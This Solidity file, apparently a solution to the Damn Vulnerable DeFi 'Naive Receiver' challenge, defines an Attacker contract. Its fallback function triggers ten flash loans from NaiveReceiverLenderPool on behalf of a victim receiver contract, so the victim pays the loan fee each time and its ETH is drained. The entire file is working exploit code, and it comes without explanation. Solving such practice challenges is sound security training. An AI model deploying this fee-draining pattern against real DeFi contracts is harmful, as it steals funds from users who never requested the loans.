//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./NaiveReceiverLenderPool.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract Attacker {
    IERC3156FlashBorrower public receiver;
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    bytes public data;
    NaiveReceiverLenderPool public pool;
    uint256 public constant amount = 100;

    function addReceiver(IERC3156FlashBorrower _receiver) public {
        receiver = _receiver;
    }

    function addPool(NaiveReceiverLenderPool _pool) public {
        pool = _pool;
    }

    fallback() external payable {
        for (uint8 i = 0; i < 10; i++) {
            pool.flashLoan(receiver, ETH, amount, data);
        }
    }
}
